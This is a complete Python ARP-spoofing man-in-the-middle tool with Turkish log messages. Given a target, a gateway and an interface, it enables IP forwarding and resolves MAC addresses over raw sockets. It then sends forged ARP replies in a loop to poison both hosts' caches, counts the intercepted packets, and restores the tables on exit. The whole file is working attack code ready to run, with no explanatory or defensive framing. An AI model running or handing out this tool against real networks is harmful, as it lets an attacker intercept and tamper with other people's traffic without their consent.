#!/usr/bin/env python3
import socket
import struct
import fcntl
import sys
import time
import signal
import subprocess
import threading


TARGET = sys.argv[1]
GATEWAY = sys.argv[2]
IFACE = sys.argv[3]

stop_flag = threading.Event()
stats = {"packets": 0, "bytes": 0}


def log(msg):
    print(msg, flush=True)


def get_iface_mac(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack("256s", ifname[:15].encode()))
    return info[18:24]


def get_iface_ip(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(s.fileno(), 0x8915, struct.pack("256s", ifname[:15].encode()))[20:24])


def mac_str(b):
    return ":".join("%02x" % x for x in b)


def build_arp(dst_mac, src_mac, op, sender_ip, target_ip, src_hw):
    frame = struct.pack("!6s6sH", dst_mac, src_mac, 0x0806)
    arp = struct.pack(
        "!HHBBH6s4s6s4s",
        1, 0x0800, 6, 4, op, src_hw,
        socket.inet_aton(sender_ip), dst_mac, socket.inet_aton(target_ip),
    )
    return frame + arp


def resolve_mac(sock, ip):
    iface_mac = get_iface_mac(IFACE)
    iface_ip = get_iface_ip(IFACE)
    req = build_arp(b"\xff" * 6, iface_mac, 1, iface_ip, ip, iface_mac)
    sock.send(req)
    deadline = time.time() + 4
    while time.time() < deadline:
        sock.settimeout(0.6)
        try:
            data, _ = sock.recvfrom(4096)
        except socket.timeout:
            continue
        if len(data) < 42:
            continue
        _dst, _src, etype = struct.unpack("!6s6sH", data[:14])
        if etype != 0x0806:
            continue
        arp = data[14:42]
        if len(arp) < 28:
            continue
        fields = struct.unpack("!HHBBH6s4s6s4s", arp)
        if fields[4] == 2 and socket.inet_ntoa(fields[6]) == ip:
            return fields[5]
    return None


def set_forward(on):
    subprocess.run(
        ["sysctl", "-w", f"net.ipv4.ip_forward={'1' if on else '0'}"],
        capture_output=True,
    )


def spoof(sock, target_mac, gateway_mac, iface_mac):
    p1 = build_arp(target_mac, iface_mac, 2, GATEWAY, TARGET, iface_mac)
    p2 = build_arp(gateway_mac, iface_mac, 2, TARGET, GATEWAY, iface_mac)
    while not stop_flag.is_set():
        sock.send(p1)
        sock.send(p2)
        time.sleep(2)


def restore(sock, target_mac, gateway_mac, iface_mac):
    p1 = build_arp(target_mac, iface_mac, 2, GATEWAY, TARGET, gateway_mac)
    p2 = build_arp(gateway_mac, iface_mac, 2, TARGET, GATEWAY, target_mac)
    for _ in range(4):
        sock.send(p1)
        sock.send(p2)
        time.sleep(1)


def capture(stop_evt, stats_obj):
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
    s.bind((IFACE, 0))
    while not stop_evt.is_set():
        try:
            s.settimeout(1.0)
            data, _ = s.recvfrom(65535)
        except socket.timeout:
            continue
        except OSError:
            break
        stats_obj["packets"] += 1
        stats_obj["bytes"] += len(data)


def stats_thread(stop_evt, stats_obj):
    last = 0
    while not stop_evt.is_set():
        time.sleep(3)
        d = stats_obj["packets"] - last
        last = stats_obj["packets"]
        log(f"[stat] paket: {stats_obj['packets']} bayt: {stats_obj['bytes']} (+{d}/3sn)")


def cleanup(sock, target_mac, gateway_mac):
    iface_mac = get_iface_mac(IFACE)
    if target_mac and gateway_mac:
        log("[*] ARP tablolari geri yukleniyor...")
        restore(sock, target_mac, gateway_mac, iface_mac)
    set_forward(False)
    log("[*] ip_forward kapatildi")
    log("[*] Durdu.")


def main():
    log(f"[*] MITM worker basladi (iface={IFACE})")
    iface_mac = get_iface_mac(IFACE)
    log(f"[*] Arayuz MAC: {mac_str(iface_mac)}  IP: {get_iface_ip(IFACE)}")
    log("[*] IP forwarding aciliyor...")
    set_forward(True)
    log("[+] ip_forward=1")

    try:
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
        sock.bind((IFACE, 0))
    except PermissionError:
        log("[-] Root yetkisi gerekli! Worker'u pkexec/sudo ile calistirin.")
        set_forward(False)
        sys.exit(1)
    except OSError as e:
        log(f"[-] Arayuz hatasi: {e}")
        set_forward(False)
        sys.exit(1)
    target_mac = resolve_mac(sock, TARGET)
    gateway_mac = resolve_mac(sock, GATEWAY)
    log(f"[+] Hedef MAC: {mac_str(target_mac) if target_mac else 'BULUNAMADI'}")
    log(f"[+] Gateway MAC: {mac_str(gateway_mac) if gateway_mac else 'BULUNAMADI'}")

    if not target_mac or not gateway_mac:
        log("[!] MAC cozulemedi. Hedef ve gateway agda aktif olmali.")

    t1 = threading.Thread(target=spoof, args=(sock, target_mac, gateway_mac, iface_mac), daemon=True)
    t2 = threading.Thread(target=capture, args=(stop_flag, stats), daemon=True)
    t3 = threading.Thread(target=stats_thread, args=(stop_flag, stats), daemon=True)
    t1.start()
    t2.start()
    t3.start()
    log("[+] ARP spoofing calisiyor. Trafik MITM uzerinden gecip gecmedigini izleyin.")

    def handler(signum, frame):
        stop_flag.set()
        cleanup(sock, target_mac, gateway_mac)
        sys.exit(0)

    signal.signal(signal.SIGTERM, handler)
    signal.signal(signal.SIGINT, handler)

    try:
        while True:
            time.sleep(0.5)
    except KeyboardInterrupt:
        handler(None, None)


if __name__ == "__main__":
    main()
